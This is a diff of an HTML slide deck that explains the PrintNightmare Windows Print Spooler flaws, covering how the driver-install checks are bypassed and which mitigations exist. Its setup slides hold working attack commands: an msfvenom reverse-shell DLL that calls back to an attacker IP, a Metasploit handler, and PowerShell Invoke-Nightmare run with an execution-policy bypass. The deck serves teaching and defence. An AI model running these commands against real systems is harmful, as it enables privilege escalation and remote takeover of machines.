@@ -25,11 +25,11 @@
 <h2>Table of Contents</h2>
 <div id="text-table-of-contents" role="doc-toc">
 <ul>
-<li><a href="#/slide-org410f532">Introduction</a></li>
-<li><a href="#/slide-org56e590a">Vulnerabiltity Analysis</a></li>
-<li><a href="#/slide-orgee946f0">Implementation</a></li>
-<li><a href="#/slide-orgc059e70">Demo</a></li>
-<li><a href="#/slide-orgee64e36">Conclusion</a></li>
+<li><a href="#/slide-org130534b">Introduction</a></li>
+<li><a href="#/slide-org0fcc231">Vulnerabiltity Analysis</a></li>
+<li><a href="#/slide-org597c210">Implementation</a></li>
+<li><a href="#/slide-org644d8a5">Demo</a></li>
+<li><a href="#/slide-org168f6ec">Conclusion</a></li>
 </ul>
 </div>
 </div>
@@ -37,8 +37,8 @@
 
 
 <section>
-<section id="slide-org410f532">
-<h2 id="org410f532">Introduction</h2>
+<section id="slide-org130534b">
+<h2 id="org130534b">Introduction</h2>
 <ul>
 <li>Windows has a service called Print Spooler</li>
 <li>Manages all local and network printing</li>
@@ -46,8 +46,8 @@
 </ul>
 
 </section>
-<section id="slide-org4e73513">
-<h3 id="org4e73513">CVEs</h3>
+<section id="slide-org2b3c1da">
+<h3 id="org2b3c1da">CVEs</h3>
 <ul>
 <li><b>CVE-2021-1675</b>, low class vulnerability, allowed privilege escalation</li>
 <li>Required direct access to the system thus labeled low risk</li>
@@ -57,39 +57,72 @@
 
 </ul>
 </section>
+<section id="slide-org244973b">
+<h3 id="org244973b">Framework</h3>
+<ul>
+<li><b>mimikatz</b> was first to implement the exploit with both CVEs</li>
+<li>It was first created as a PoC to show vulns in MS authentication protocols</li>
+<li>Now it is used by attackers and pentesters to detect potential exploits</li>
+
+</ul>
+
+</section>
 </section>
 <section>
-<section id="slide-org56e590a">
-<h2 id="org56e590a">Vulnerabiltity Analysis</h2>
+<section id="slide-org0fcc231">
+<h2 id="org0fcc231">Vulnerabiltity Analysis</h2>
 <ul>
 <li><p>
 Two vulns are triggered by the PrintSpoolerService RPC method
 </p>
 
-<div id="orga0f260a" class="figure">
+<div id="org9c09bef" class="figure">
 <p><img src="./assets/nspt/cve1.png" alt="cve1.png" width="70%" />
 </p>
 </div>
 
 
-<div id="org98f16f4" class="figure">
+<div id="orga9bec3b" class="figure">
 <p><img src="./assets/nspt/cve2.png" alt="cve2.png" width="70%" />
 </p>
 </div></li>
 
-<li><b>mimikatz</b> was first to implement the exploit with both CVEs</li>
-
 </ul>
 
 </section>
-<section id="slide-org384771a">
-<h3 id="org384771a">The Vulnerability</h3>
+<section id="slide-org1500b92">
+<h3 id="org1500b92">Continued ..</h3>
 <ul>
+<li>Once the RPC functions are processed, the YAddPrinterDriverEx function is called</li>
+<li>There is no conditional judgment on the param dwFileCopyFlags</li>
 <li><p>
-Use Process monitor to capture EXP when DLL is loaded
+The AddPrinterDriverEx function installs local/remote printer drivers and links config, data and driver files
 </p>
 
-<div id="org329c576" class="figure">
+<div id="orgcabd7c3" class="figure">
+<p><img src="./assets/nspt/addprinter.png" alt="addprinter.png" class="middle" />
+</p>
+</div></li>
+<li>dwFileCopyFLags can set &ldquo;APD INSTALL WARNED DRIVER&rdquo; flag</li>
+<li><p>
+When printer driver is added, the DLL is loaded with highest privilege<br />
+</p></li>
+
+</ul>
+
+<div id="orge225e9d" class="figure">
+<p><img src="./assets/nspt/error.png" alt="error.png" />
+</p>
+</div>
+</section>
+<section id="slide-orgcde179e">
+<h3 id="orgcde179e">The Vulnerability</h3>
+<ul>
+<li><p>
+Use Process monitor to capture exploit when DLL is loaded
+</p>
+
+<div id="org6bcf8ae" class="figure">
 <p><img src="./assets/nspt/pm.png" alt="pm.png" width="70%" />
 </p>
 </div></li>
@@ -103,8 +136,8 @@ dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
 
 </ul>
 </section>
-<section id="slide-orgaf4f752">
-<h3 id="orgaf4f752">ValidateObjectAccess</h3>
+<section id="slide-org56b003d">
+<h3 id="org56b003d">ValidateObjectAccess</h3>
 <ul>
 <li>mimikatz will pass RpcBindingSetAuthInfoEx method with some params</li>
 <li>After execution, user sets username which is regarded as permission</li>
@@ -112,24 +145,23 @@ dwFileCopyFlags check is skipped when calling YAddPrinterDriverEx method
 ValidateObjectAccess result is 0 for user and 1 for admin
 </p>
 
-<div id="org59eaec2" class="figure">
+<div id="orgbd34873" class="figure">
 <p><img src="./assets/nspt/rpcbind.png" alt="rpcbind.png" width="60%" />
 </p>
 </div></li>
-<li>To bypass the ValidateObjectAccess, if the &ldquo;APD INSTALL WARNED DRIVER&rdquo; is set to 1</li>
 <li><p>
-The result of _bittest method is 1, as a result ValidateObjectAccess is bypassed
+If the &ldquo;APD INSTALL WARNED DRIVER&rdquo; flag is 1, the result of _bittest method will be 1 and v12 will be 0, as a result ValidateObjectAccess is bypassed
 </p>
 
-<div id="org1e19e1d" class="figure">
+<div id="orgf111517" class="figure">
 <p><img src="./assets/nspt/bittest.png" alt="bittest.png" width="60%" />
 </p>
 </div></li>
 
 </ul>
 </section>
-<section id="slide-org407edf6">
-<h3 id="org407edf6">ValidateDriverInfo</h3>
+<section id="slide-org6bd9ca6">
+<h3 id="org6bd9ca6">ValidateDriverInfo</h3>
 <ul>
 <li>This part checks if the driver name is valid</li>
 <li>Execution flow is as follows:
@@ -146,15 +178,15 @@ This skips further verification by driver
 </p>
 
 
-<div id="orgc6838f7" class="figure">
+<div id="org2dee156" class="figure">
 <p><img src="./assets/nspt/dwfile.png" alt="dwfile.png" width="50%" />
 </p>
 </div></li>
 
 </ul>
 </section>
-<section id="slide-orgff598d8">
-<h3 id="orgff598d8">Get file handle</h3>
+<section id="slide-org5a5a21a">
+<h3 id="org5a5a21a">Get file handle</h3>
 <ul>
 <li>Value of v13 is obtained by inverting lower 8 bits of dwFileCopyFlags</li>
 <li>Shifting it 4 bits to right and performing AND with 1</li>
@@ -162,7 +194,7 @@ This skips further verification by driver
 v13 determines 5th param of the CreateInternalDriverFileArray
 </p>
 
-<div id="org8415478" class="figure">
+<div id="orgaa95716" class="figure">
 <p><img src="./assets/nspt/spl.png" alt="spl.png" width="60%" />
 </p>
 </div></li>
@@ -170,13 +202,13 @@ v13 determines 5th param of the CreateInternalDriverFileArray
 
 </ul>
 </section>
-<section id="slide-orgff598d8-split">
+<section id="slide-org5a5a21a-split">
 <ul>
 <li><p>
 When a5 is 0, validity check of the driver can be avoided
 </p>
 
-<div id="org74b9c29" class="figure">
+<div id="org7530d50" class="figure">
 <p><img src="./assets/nspt/a5.png" alt="a5.png" width="50%" />
 </p>
 </div></li>
@@ -187,8 +219,8 @@ When a5 is 0, validity check of the driver can be avoided
 </ul>
 
 </section>
-<section id="slide-org0c72f42">
-<h3 id="org0c72f42">Copy files to driver space</h3>
+<section id="slide-org5d4cacf">
+<h3 id="org5d4cacf">Copy files to driver space</h3>
 <ul>
 <li>pConfigFile, pDataFile and pDriverPath save their respective file paths</li>
 <li>When moving files of the above members, the following operations are required:
@@ -199,7 +231,7 @@ When a5 is 0, validity check of the driver can be avoided
 Using MoveNewDriverRelatedFiles, move files and realize the update file
 </p>
 
-<div id="org304603c" class="figure">
+<div id="orgff6892b" class="figure">
 <p><img src="./assets/nspt/copy.png" alt="copy.png" width="60%" />
 </p>
 </div></li>
@@ -208,8 +240,8 @@ Using MoveNewDriverRelatedFiles, move files and realize the update file
 
 </ul>
 </section>
-<section id="slide-orgbbe17a0">
-<h3 id="orgbbe17a0">Update Driver Files</h3>
+<section id="slide-orgbb07857">
+<h3 id="orgbb07857">Update Driver Files</h3>
 <ul>
 <li>Load the new config file</li>
 <li>When loaded it will run the driver&rsquo;s DLL</li>
@@ -221,8 +253,8 @@ Using MoveNewDriverRelatedFiles, move files and realize the update file
 </section>
 </section>
 <section>
-<section id="slide-orgee946f0">
-<h2 id="orgee946f0">Implementation</h2>
+<section id="slide-org597c210">
+<h2 id="org597c210">Implementation</h2>
 <ul>
 <li>Environment:
 <ul>
@@ -245,14 +277,14 @@ Using MoveNewDriverRelatedFiles, move files and realize the update file
 </ul>
 
 </section>
-<section id="slide-org41215e5">
-<h3 id="org41215e5">Setup</h3>
+<section id="slide-org9fea903">
+<h3 id="org9fea903">Setup</h3>
 <ul>
 <li><p>
 Setup exploit DLL
 </p>
 <pre  class="example" >
-msfvenom -p /reverse_tcp_path LHOST=[YOUR_IP] LPORT=4545 -f dll -o spoolerevil.dll
+msfvenom -p /path/to/reverse_tcp LHOST=[YOUR_IP] LPORT=4545 -f dll -o reverse_tcp.dll
 </pre></li>
 <li><p>
 Execute DLL
@@ -271,8 +303,11 @@ run -j
 DLL Injection
 </p>
 <pre  class="example" >
-python CVE-2021-1675.py username:password@&lt;targetName or address&gt; Path to DLL
+powershell -ep bypass
+..\CVE-2021-1675.ps1
+Invoke-Nightmare -DLL C:\Users\test\Desktop\reverse_tcp.dll
 
+# go back to msfconsole
 session -i 1
 </pre></li>
 
@@ -281,17 +316,18 @@ session -i 1
 </section>
 </section>
 <section>
-<section id="slide-orgc059e70">
-<h2 id="orgc059e70">Demo</h2>
+<section id="slide-org644d8a5">
+<h2 id="org644d8a5">Demo</h2>
 </section>
 </section>
 <section>
-<section id="slide-orgee64e36">
-<h2 id="orgee64e36">Conclusion</h2>
+<section id="slide-org168f6ec">
+<h2 id="org168f6ec">Conclusion</h2>
 <ul>
 <li>Spooler vuln was first used in Stuxnet attack 10 years ago</li>
-<li>MSs incomplete patch of the CVEs made windows users vulnerable to attacks</li>
-<li>MS has taken step to ameliorate the situation but 34527 is still unsolved</li>
+<li>MS has taken step to ameliorate the situation and released patches within 5 days</li>
+<li>A quick way to stop the vulnerability is to stop the PrintSpooler service</li>
+<li>Another workaround is to disable the inbound remote printing operations via group policy</li>
 
 </ul>
 </section>
